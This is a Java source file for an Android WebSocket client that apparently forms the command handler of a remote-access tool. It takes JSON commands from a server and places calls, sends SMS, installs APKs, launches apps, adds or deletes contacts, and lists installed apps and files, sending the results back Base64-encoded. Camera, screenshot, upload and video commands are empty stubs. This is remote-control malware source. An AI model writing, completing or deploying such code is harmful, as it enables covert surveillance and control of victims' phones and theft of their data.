package com.ot.grhq.client;

import android.content.Context;
import android.util.Base64;

import com.ot.grhq.client.functionality.FileManager;
import com.ot.grhq.client.functionality.PackageManager;
import com.ot.grhq.client.functionality.Phone;
import com.ot.grhq.client.functionality.SMS;

import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URI;
import java.util.List;
import java.util.Map;

public class WebSocketClient extends org.java_websocket.client.WebSocketClient {

    private Context context;

    public WebSocketClient(Context context, URI serverUri) {
        super(serverUri);
        this.context = context;
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {

    }

    @Override
    public void onMessage(String message) {
        try {
            JSONObject json = new JSONObject(message);
            Command cmd = Command.valueOf(json.optString("cmd"));

            switch (cmd) {
                case CALL:
                    Phone.call(context, json.getString("number"));
                    break;
                case CAMERA_BACK:
                    break;
                case CAMERA_FRONT:
                    break;
                case DELETE_CONTACT:
                    Phone.deleteContact(json.getString("name"), json.getString("number"));
                    break;
                case DOWNLOAD_FILE:
                    break;
                case INSTALL_APK:
                    PackageManager.installApp(context, json.getString("path"));
                    break;
                case LAUNCH_APP:
                    PackageManager.launchApp(context, json.getString("package"));
                    break;
                case LIST_INSTALLED_APPS:
                    Map<String, String> apps = PackageManager.getInstalledApps(context);
                    sendResponse("app_list", mapToJson(apps).toString());
                    break;
                case LIST_FILES:
                    List<String> files = FileManager.listFiles(json.getString("path"));
                    sendResponse("files", files.toString());
                    break;
                case READ_CONTACTS:
                    break;
                case SCREENSHOT:
                    break;
                case TEXT:
                    SMS.send(json.getString("name"), json.getString("number"));
                    break;
                case UPLOAD_FILE:
                    break;
                case VIDEO:
                    break;
                case WRITE_CONTACT:
                    Phone.addContact(context, json.getString("name"), json.getString("number"));
                    break;
                default:
                    break;
            }
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {

    }

    @Override
    public void onError(Exception ex) {

    }

    private void sendResponse(String responseType, String data) throws JSONException {
        JSONObject json = new JSONObject();
        json.put("type", "client");
        json.put("res", responseType);
        json.put("data", Base64.encode(data.getBytes(), Base64.DEFAULT));

        send(json.toString());
    }

    private JSONObject mapToJson(Map<String, String> map) {
        JSONObject jsonObject = new JSONObject();

        // Iterate through the map entries and add them to the JSONObject
        for (Map.Entry<String, String> entry : map.entrySet()) {
            try {
                jsonObject.put(entry.getKey(), entry.getValue());
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

        return jsonObject;
    }
}
